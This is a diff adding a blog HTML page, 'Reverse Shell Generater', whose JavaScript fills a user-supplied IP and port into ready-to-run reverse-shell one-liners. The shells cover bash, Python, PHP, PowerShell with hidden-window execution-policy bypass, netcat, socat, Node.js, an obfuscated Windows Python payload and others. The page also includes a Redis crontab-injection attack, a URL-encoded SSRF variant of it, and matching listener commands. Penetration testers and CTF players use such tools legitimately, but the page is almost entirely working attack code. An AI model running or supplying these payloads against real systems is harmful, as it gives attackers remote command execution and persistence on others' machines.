@@ -1,0 +1,307 @@
+
+
+  <!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+
+  
+  <meta name="description" content="There is no description">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+	<meta property="og:title" content="Reverse Shell Generater"/>
+
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-155094238-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-155094238-1');
+</script>
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="AresX's Blog" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-atom-dark.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+	
+		<div class="page-header">
+			<h1> Reverse Shell Generater</h1>
+		</div>
+	
+
+
+
+<div class="row page">
+	<!-- cols -->
+	
+	<div class="col-md-12"> 
+	
+
+	  
+<!--<h1>Reverse Shell Generater</h1>-->
+
+<code>一句话反弹shell生成器</code>
+
+<p><textarea rows="1" style="width: 20%; box-sizing: border-box;resize: none;" id="ip" placeholder="IP ADDRESS"></textarea>
+<textarea rows="1" style="width: 10%; box-sizing: border-box;resize: none;" id="port" placeholder="PORT"></textarea><br>
+HANDLER COMMAND<br>
+<textarea rows="3" style="width: 50%; box-sizing: border-box;" id="handler" onclick="this.focus();" readonly></textarea></p>
+BASH REVERSE SHELL
+<textarea rows="5" style="width: 100%; box-sizing: border-box;" id="bash" onclick="this.focus();" readonly></textarea></p>
+ZSH REVERSE SHELL
+<textarea rows="2" style="width: 100%; box-sizing: border-box;" id="zsh" onclick="this.focus();" readonly></textarea></p>
+PERL REVERSE SHELL
+<textarea rows="8" style="width: 100%; box-sizing: border-box;" id="perl" onclick="this.focus(); " readonly></textarea></p>
+PERL REVERSE SHELL WINDOWS
+<textarea rows="2" style="width: 100%; box-sizing: border-box;" id="perlwin" onclick="this.focus(); " readonly></textarea></p>
+RUBY REVERSE SHELL
+<textarea rows="6" style="width: 100%; box-sizing: border-box;" id="ruby" onclick="this.focus(); " readonly></textarea></p>
+RUBY REVERSE SHELL WINDOWS
+<textarea rows="2" style="width: 100%; box-sizing: border-box;" id="rubywin" onclick="this.focus(); " readonly></textarea></p>
+NETCAT REVERSE SHELL
+<textarea rows="9" style="width: 100%; box-sizing: border-box;" id="netcat" onclick="this.focus(); " readonly></textarea></p>
+NCAT REVERSE SHELL
+<textarea rows="2" style="width: 100%; box-sizing: border-box;" id="ncat" onclick="this.focus(); " readonly></textarea></p>
+SOCAT REVERSE SHELL
+<textarea rows="2" style="width: 100%; box-sizing: border-box;" id="socat" onclick="this.focus(); " readonly></textarea></p>
+PYTHON REVERSE SHELL
+<textarea rows="9" style="width: 100%; box-sizing: border-box;" id="python" onclick="this.focus(); " readonly></textarea></p>
+PYTHON3 REVERSE SHELL
+<textarea rows="9" style="width: 100%; box-sizing: border-box;" id="python3" onclick="this.focus(); " readonly></textarea></p>
+PYTHON REVERSE SHELL WINDOWS
+<textarea rows="25" style="width: 100%; box-sizing: border-box;" id="pythonwin" onclick="this.focus(); " readonly></textarea></p>
+PHP REVERSE SHELL
+<textarea rows="12" style="width: 100%; box-sizing: border-box;" id="php" onclick="this.focus(); " readonly></textarea></p>
+TELNET REVERSE SHELL
+<textarea rows="4" style="width: 100%; box-sizing: border-box;" id="telnet" onclick="this.focus(); " readonly></textarea></p>
+POWERSHELL REVERSE SHELL
+<textarea rows="15" style="width: 100%; box-sizing: border-box;" id="powershell" onclick="this.focus(); " readonly></textarea></p>
+AWK REVERSE SHELL
+<textarea rows="3" style="width: 100%; box-sizing: border-box;" id="awk" onclick="this.focus(); " readonly></textarea></p>
+JAVA REVERSE SHELL
+<textarea rows="2" style="width: 100%; box-sizing: border-box;" id="java" onclick="this.focus(); " readonly></textarea></p>
+NODE.JS REVERSE SHELL
+<textarea rows="3" style="width: 100%; box-sizing: border-box;" id="nodejs" onclick="this.focus(); " readonly></textarea></p>
+TCLSH REVERSE SHELL
+<textarea rows="3" style="width: 100%; box-sizing: border-box;" id="tclsh" onclick="this.focus(); " readonly></textarea></p>
+REDIS REVERSE SHELL
+<textarea rows="4" style="width: 100%; box-sizing: border-box;" id="redis" onclick="this.focus(); " readonly></textarea></p>
+REDIS_URL REVERSE SHELL
+<textarea rows="4" style="width: 100%; box-sizing: border-box;" id="redisurl" onclick="this.focus(); " readonly></textarea></p>
+OPENSSL ENCRYPT REVERSE SHELL
+<textarea rows="4" style="width: 100%; box-sizing: border-box;" id="openssl" onclick="this.focus(); " readonly></textarea></p>
+
+<br>
+<script>
+var IPADDR = document.querySelector('textarea#ip');
+var PORT = document.querySelector('textarea#port');
+
+
+var BASH="bash -i >& /dev/tcp/[IPADDR]/[PORT] 0>&1"+"\n\n"
++"0<&196;exec 196<>/dev/tcp/[IPADDR]/[PORT]; sh <&196 >&196 2>&196"+"\n\n"
++"exec 5<> /dev/tcp/[IPADDR]/[PORT]; cat <&5 | while read line; do $line 2>&5>&5; done";
+
+var ZSH="zmodload zsh/net/tcp && ztcp [IPADDR] [PORT] && zsh >&$REPLY 2>&$REPLY 0>&$REPLY"
+
+var PERL="perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"[IPADDR]:[PORT]\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n\n"
++"perl -e 'use Socket;$i=\"[IPADDR]\";$p=[PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+
+var PERLWIN="perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"[IPADDR]:[PORT]\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+
+var RUBY = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"[IPADDR]\",\"[PORT]\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n\n"
++"ruby -rsocket -e'f=TCPSocket.open(\"[IPADDR]\",[PORT]).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+
+var RUBYWIN = "ruby -rsocket -e 'c=TCPSocket.new(\"[IPADDR]\",\"[PORT]\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+
+var NETCAT = "nc -c /bin/sh [IPADDR] [PORT]\n\n"
++"nc -e /bin/sh [IPADDR] [PORT]\n\n"
++"/bin/sh | nc [IPADDR] [PORT]\n\n"
++"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IPADDR] [PORT] >/tmp/f\n\n"
++"rm -f /tmp/p; mknod /tmp/p p && nc [IPADDR] [PORT] 0/tmp/p"
+
+var NCAT = "ncat [IPADDR] [PORT] -e /bin/sh"
+var SOCAT = "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[IPADDR]:[PORT]"
+var PYTHON = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[IPADDR]\",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"
++"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[IPADDR]\",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'"
+
+var PYTHON3 ="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[IPADDR]\",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"
++"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[IPADDR]\",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'"
+
+var PYTHONWIN = "C:\\Python27\\python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('[IPADDR]', [PORT])), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\\\windows\\\\system32\\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\""
+
+var PHP = "php -r '$sock=fsockopen(\"[IPADDR]\",[PORT]);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n"
++"php -r '$s=fsockopen(\"[IPADDR]\",[PORT]);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n"
++"php -r '$s=fsockopen(\"[IPADDR]\",[PORT]);`/bin/sh -i <&3 >&3 2>&3`;'\n\n"
++"php -r '$s=fsockopen(\"[IPADDR]\",[PORT]);system(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n"
++"php -r '$s=fsockopen(\"[IPADDR]\",[PORT]);popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'\n\n"
++"php -r '$sock=fsockopen(\"[IPADDR]\",[PORT]); $proc = proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);'"
+
+var TELNET = "TELNET REVERSE SHELL|rm -f /tmp/p; mknod /tmp/p p && telnet [IPADDR] [PORT] 0/tmp/p\n\n"
++"TELNET REVERSE SHELL|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet [IPADDR] [PORT] > /tmp/f"
+
+var POWERSHELL = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"[IPADDR]\",[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n\n"
++"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('[IPADDR]',[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
+
+var AWK ="awk 'BEGIN {s = \"/inet/tcp/0/[IPADDR]/[PORT]\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
+
+var JAVA = "Runtime.getRuntime();p = r.exec([\"/bin/sh\",\"-c\",\"exec 5<>/dev/tcp/[IPADDR]/[PORT];cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]);p.waitFor();"
+
+var NODEJS = "(function(){var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);var client=new net.Socket();client.connect([PORT],\"[IPADDR]\",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();"
+
+var TCLSH = "echo 'set s [socket [IPADDR] [PORT]];while 42 { puts -nonewline $s \"shell>\";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh"
+
+var REDIS = "set 1 \"\\n\\n\\n\\n* * * * * root bash -i >& /dev/tcp/[IPADDR]/[PORT] 0>&1\\n\\n\\n\\n\"\n"
++"config set dir /etc/\n"
++"config set dbfilename crontab\n"
++"save\n"
+
+var REDISURL = "http://x.x.x.x:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F[IPADDR]%2F[PORT]%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa"
+
+var OPENSSL = "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n"
++"openssl s_server -quiet -key key.pem -cert cert.pem -port [PORT]\n"
++"mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect [IPADDR]:[PORT] > /tmp/s; rm /tmp/s\n"
+
+
+function processInput() {
+    handler.value = "MAC: nc -l "+ PORT.value +"\n"
+    + "LINUX: nc -lvvp "+ PORT.value + "\n"
+    + "WINDOWS: nc.exe -l -p" + PORT.value+"\n"
+    bash.value = rep(BASH);
+    zsh.value=rep(ZSH)
+    perl.value = rep(PERL);
+    perlwin.value = rep(PERLWIN)
+    ruby.value = rep(RUBY);
+    rubywin.value = rep(RUBYWIN);
+    netcat.value = rep(NETCAT);
+    ncat.value = rep(NCAT);
+    socat.value=rep(SOCAT);
+    python.value = rep(PYTHON);
+    python3.value = rep(PYTHON3);
+    pythonwin.value = rep(PYTHONWIN);
+    php.value = rep (PHP);
+    telnet.value = rep(TELNET);
+    powershell.value = rep(POWERSHELL);
+    awk.value = rep(AWK);
+    java.value = rep(JAVA);
+    nodejs.value = rep(NODEJS);
+    tclsh.value = rep(TCLSH);
+    redis.value =rep(REDIS);
+    redisurl.value =rep(REDISURL);
+    openssl.value = rep(OPENSSL)
+}
+
+function rep(str){
+    return str.replace(/\[IPADDR\]/g,IPADDR.value).replace(/\[PORT\]/g,PORT.value);
+}
+
+    ip.addEventListener('input', processInput, false);
+    port.addEventListener('input', processInput, false);
+</script>
+	
+    </div>
+
+  
+	<!-- comment -->
+	<!--
+-->
+	
+		
+
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
+
+   
